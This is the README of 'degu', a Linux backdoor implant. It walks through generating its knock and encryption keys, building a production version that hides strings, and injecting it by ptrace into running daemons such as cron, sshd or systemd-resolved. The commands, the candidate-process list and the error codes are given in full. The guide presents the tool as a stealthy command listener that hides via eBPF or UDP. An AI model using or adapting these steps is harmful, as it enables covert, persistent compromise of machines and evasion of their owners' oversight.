
- [Building degu](#building-degu)
    - [keys](#keys)
        - [keys generation](#keys-generation)
        - [keys recovery](#keys-recovery)
    - [compilation](#compilation)
        - [PRODUCTION Build](#production-build)
        - [DEBUG Build](#debug-build)
- [Injection](#injection)
    - [as root](#as-root)
    - [as user](#as-user)
- [Using degu](#using-degu)


## Building degu

### keys
#### keys generation
To build degu first you need to generate ED25519 key pair.
On the client part ( python degu.py lib) you have a function `keygen()` that generate all
secrets for a futur degu release:

-   IV and KNOCK_KEY are used to trigger initial communication with degu and for data ciphering after key exchange.
-   MASTER_PUBKEY is the public part of ed25519 key it is used by degu to verify signature and make secret exchange with client for encryption
-   PRIVATE_KEY is used by client part, you need to pass it in constructor of degu  python object

```python
>>> import degu
>>> myheaderfile = degu.degu.keygen()
>>> print(myheaderfile)
#define IV            { 0x03,0x7b,0xb6,0x59,0x62,0xf0,0xf5,0x56,0xa6,0x68,0xfc,0xa1,0x97,0xb8,0xbd,0x85}
#define KNOCK_KEY     { 0xc9,0xd5,0x52,0x70,0xd1,0x28,0xae,0xcd,0x96,0xda,0xa6,0x5c,0x57,0xf4,0x27,0x92,0xb7,0x65,0x3f,0xd3,0xc5,0x60,0x68,0x05,0x1f,0x71,0xed,0x8d,0xa9,0x3e,0x38,0x58}
#define MASTER_PUBKEY { 0x58,0xe4,0x37,0x0f,0x17,0x5f,0x3f,0xd7,0x07,0x3d,0xd0,0x77,0xbe,0x86,0x9a,0x60,0x34,0x80,0xff,0xae,0xcc,0xf2,0xa1,0x1d,0x60,0xff,0x76,0x44,0xfc,0x26,0x9d,0x06}

// PRIVATE_KEY="f04860177b7bcb3a4b9aaaa052fbd9218d6f0117bb0c9c7a02905809d1a0747ccc5b728445811ed1222ed1e024042c37b2164b494bb77f867d54b63f29cb62e1"

```
you can also directly call the C function keygen in degu.so library with a filename to generate as parameter (you can discard secret1 and secret2 variables that are tests on ECDH)

```python
>>> import ctypes
>>> mydegu = ctypes.CDLL("../degu.so")
>>> mydegu.keygen(b"/tmp/out")
0
>>> 
[1]+  Stopped                 python
$ cat /tmp/out 
pub="63181b1acc84276954cd80be5afb0c95de7b1b7c9fb3c4e3b8e364a85f890116"
priv="5837122bd526a2e5d64ef89aca78d80ac4e0b4ef4d1d76a6ddb18bdd17856a6911602bdebf237a361ab796518038d5aef88b0aebdc3c1523407f0ab62e457420"
iv="4e6e4e04de107ae5790c5bfe61ce52e5"
knock="79abc02eeb0bcf41c1a1e6f8491eb0b3cedce7786338cc88955f4cf76fa79f52"
secret1="cdb26065a115d0d4fede1efdb0eff4805ebdbd376cb4696bf30e90f6a474a433"
secret2="cdb26065a115d0d4fede1efdb0eff4805ebdbd376cb4696bf30e90f6a474a433"
```

Or you can just use the client script to generate this file

```bash
 $ ./dgu keygen
#define IV            { 0x3c,0x65,0x64,0x22,0x64,0x11,0x6f,0xc8,0x68,0xfd,0xa9,0x52,0xc6,0x7b,0x15,0xd1}
#define KNOCK_KEY     { 0xf9,0x7e,0x46,0x46,0xaa,0xd9,0xaa,0x96,0xfb,0xba,0x81,0x70,0x51,0xc3,0x98,0x1e,0x74,0xd5,0x7c,0x28,0x09,0x7f,0xbd,0x52,0xd4,0xdf,0x32,0x90,0xfe,0x94,0xa9,0x36}
#define MASTER_PUBKEY { 0x60,0x88,0xdd,0xfc,0xee,0x3c,0x21,0xf5,0xb6,0x69,0x13,0xa9,0xf8,0xa7,0xc9,0xb9,0x50,0x25,0x14,0xfe,0x18,0x44,0x5d,0xea,0xad,0x25,0x55,0x08,0x60,0x60,0x89,0xa0}

// PRIVATE_KEY="c8ecf68f5fad5fc8b9232548ff38bdbb81aa13d3d6cab322aaf2037802d3554b87755b4056bd4b5f4bc9219cc1615bc59afe2e69fbbd6cf633d8f9f74674579e"

```
The output needs to be piped into **keys.h** file at root of degu project

#### keys recovery
If you lost the header file you can still recover it by calling python function `getpub()`

```python
>>> import degu
>>> degu.degu.getpub()
#define IV            { 0x3c,0x65,0x64,0x22,0x64,0x11,0x6f,0xc8,0x68,0xfd,0xa9,0x52,0xc6,0x7b,0x15,0xd1}
#define KNOCK_KEY     { 0xf9,0x7e,0x46,0x46,0xaa,0xd9,0xaa,0x96,0xfb,0xba,0x81,0x70,0x51,0xc3,0x98,0x1e,0x74,0xd5,0x7c,0x28,0x09,0x7f,0xbd,0x52,0xd4,0xdf,0x32,0x90,0xfe,0x94,0xa9,0x36}
#define MASTER_PUBKEY { 0x60,0x88,0xdd,0xfc,0xee,0x3c,0x21,0xf5,0xb6,0x69,0x13,0xa9,0xf8,0xa7,0xc9,0xb9,0x50,0x25,0x14,0xfe,0x18,0x44,0x5d,0xea,0xad,0x25,0x55,0x08,0x60,0x60,0x89,0xa0}
```
By calling directly degu.so function `xpub()`, it outputs the file on stdout
```python
>>> import ctypes
>>> d = ctypes.CDLL("../degu.so")
>>> d.xpub()
#define IV		{0x3c,0x65,0x64,0x22,0x64,0x11,0x6f,0xc8,0x68,0xfd,0xa9,0x52,0xc6,0x7b,0x15,0xd1}
#define KNOCK_KEY	{0xf9,0x7e,0x46,0x46,0xaa,0xd9,0xaa,0x96,0xfb,0xba,0x81,0x70,0x51,0xc3,0x98,0x1e,0x74,0xd5,0x7c,0x28,0x09,0x7f,0xbd,0x52,0xd4,0xdf,0x32,0x90,0xfe,0x94,0xa9,0x36}
#define MASTER_PUBKEY	{0x60,0x88,0xdd,0xfc,0xee,0x3c,0x21,0xf5,0xb6,0x69,0x13,0xa9,0xf8,0xa7,0xc9,0xb9,0x50,0x25,0x14,0xfe,0x18,0x44,0x5d,0xea,0xad,0x25,0x55,0x08,0x60,0x60,0x89,0xa0}
6
>>> 
```

Or you can just use the client script to recover keys

```bash
 $ ./dgu getpub
#define IV            { 0x3c,0x65,0x64,0x22,0x64,0x11,0x6f,0xc8,0x68,0xfd,0xa9,0x52,0xc6,0x7b,0x15,0xd1}
#define KNOCK_KEY     { 0xf9,0x7e,0x46,0x46,0xaa,0xd9,0xaa,0x96,0xfb,0xba,0x81,0x70,0x51,0xc3,0x98,0x1e,0x74,0xd5,0x7c,0x28,0x09,0x7f,0xbd,0x52,0xd4,0xdf,0x32,0x90,0xfe,0x94,0xa9,0x36}
#define MASTER_PUBKEY { 0x60,0x88,0xdd,0xfc,0xee,0x3c,0x21,0xf5,0xb6,0x69,0x13,0xa9,0xf8,0xa7,0xc9,0xb9,0x50,0x25,0x14,0xfe,0x18,0x44,0x5d,0xea,0xad,0x25,0x55,0x08,0x60,0x60,0x89,0xa0}
```
### compilation

With your keys setup and `./keys.h` updated you can build degu as production or debug release.

In production release it hides strings and debug messages.

#### PRODUCTION Build 

```
$ make clean && make
```

#### DEBUG Build

```
$ make clean && DEBUG=yes make 
```
The debug build outputs all messages in /tmp/debug (settings in `degu/log.c` file)

## Injection

### as root 

We'll try to infect cron for ex:

```
# ps -ef |grep [c]ron
root         786       1  0 Dec21 ?        00:00:00 /usr/sbin/crond -n
# ./degu.so 786
#
```

If we don't want to choose a process degu have some candidate process included.

You just needs to launch degu without args as root and one candidate process will be infected. So just :

```
# ./degu.so
```


Actually 8 process are candidate, you can edit and add some editing `degu/main.c` file :
```c
#define CANDSIZE 9
char *candidate[CANDSIZE]= {
    "udev",
    "cron",
    "udisksd",
    "syslog",
    "containerd",
    "sshd",
    "getty",
    "dhcp",
    NULL
};
```

If all goes ok degu choose a process in canditate list, infect it, setup his internal ebpf rule and wait for commands.

But it can fail for some reason linked to process execution context, in this case it'll output a smiley and error code:

- `3<`
    - Attach failed, degu couldn't attach the process via ptrace ( err `-1001` )
- `:(`
    - Injection failed, degu couldn't write into process memory ( err `-1002` )
- `:/`
    - Seccomp error, degu don't want to inject into process because of too restrictive seccomp policy ( err `-1003` )
- `:\`
    - Deleted libs error, degu don't want to inject into process because dlopen invocation will fail ( err `-1004` )

### as user
You can use degu as non root user, but it will use a listen port in UDP instead of using an ebpf rule so it'll not be stealth if someone list UDP listen port.

Yet it will use userland execution to parasite a process so you'll need to chose a process like dhclient, sip server, resolver or any legitimate process that can use UDP.

For example we want to wait for commands on 1234 UDP port parasiting systemd-resolved process :

```sh
$ ./degu.so 1234 /lib/systemd/systemd-resolved
$ ps -ef |grep [s]ystemd-resolved
user     3855960    2963  0 12:02 ?        00:00:00 /lib/systemd/systemd-resolved
$ ss -lnup|grep 1234
UNCONN 0      0                       0.0.0.0:1234       0.0.0.0:*    users:(("systemd-resolve",pid=3855960,fd=3))
$ ls -al /proc/3855960/exe 
lrwxrwxrwx 1 user user 0 Dec 22 12:02 /proc/3855960/exe -> /usr/lib/systemd/systemd-resolved
```

## Using degu

For client part see [degu-client](https://github.com/io-tl/degu-client) project